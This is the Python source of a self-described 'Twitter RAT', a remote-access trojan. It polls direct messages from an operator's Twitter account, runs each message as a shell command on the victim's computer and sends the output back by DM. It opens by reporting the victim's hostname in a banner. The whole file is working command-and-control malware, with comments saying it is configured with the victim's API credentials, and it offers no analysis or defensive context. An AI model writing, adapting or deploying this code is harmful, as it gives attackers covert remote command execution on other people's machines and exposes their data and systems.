import tweepy
import re
import os
import time

## Complete API Parameters before use -- configured for victim user ##
consumer_key = ''
consumer_secret = ''
access_token = ''
access_token_secret = ''

## Complete info on user account ##
c2_usr = ''

auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
auth.set_access_token(access_token, access_token_secret)
api = tweepy.API(auth)
userid = re.findall(r'(?<=u\'id\': )[0-9]+', str(api.get_user(c2_usr)))[0]

def get_command(api, lastcommand):
    raw_dms = api.direct_messages()
    dms = re.findall(r'(?<=sender_id_str=u\''+userid+'\\\', text=u\')[^\']+', str(raw_dms))
    if dms[0] != lastcommand:
        return dms[0]
    else:
        return None

def write_message(api, message):
    api.send_direct_message(screen_name=c2_usr, text=message)

last_command = None
last_command = get_command(api, last_command)
hostname = str(os.popen('hostname').read()).replace('\n','')
splash = '''
=====================================
==.................................==
==..........TWITTER RAT............==
==....COMMAND AND CONTROL TROJAN...==
==.................................==
=====================================

_____$$$$$s__________________________
_____$$$$$$$$s_______________________
___$$$$(O)$$$$$$_____________________
_$$$_$$$$$$$$$$______________________
_______$$$$$$$$$$s___________________
_________$$$$$$$$$$$s_____CONNECTION_
_________$$$$$$$$$$$$$$_____RECIEVED_
_________$$$$$$$$$$$$$$$$_____FROM:__
_________s$$$$$$$$$$$$$$$$$_____%s
___________$$$$$$$$$$$$$$$$$$________
_____________$$$$$$$$$$$$$$$$$$______
_________________$$$$$$$$$$$$$$$$____
_______________$$$$$______$$$$$$$$___
_________$$$$$$$$$____________$$$$$$_
''' % (hostname)
try:
    write_message(api, splash)
    print "[+] Twitter RAT connection established...\n"
except:
    print "[-] Something went wrong...\n"
    exit

while True:
    command = get_command(api, last_command)
    if command:
        print '[+] Command Recieved - ' + command
        time.sleep(2)
        last_command = command
        try:
            result = os.popen(command).read()
            if result == '':
                result = '[-] ERROR - COMMAND FAILED'
        except:
            result = '[-] ERROR - COMMAND FAILED'
            print '[-] ERROR - COMMAND FAILED'
        print '[+] Sending Result - \n' + result
        write_message(api, result)
    time.sleep(1)
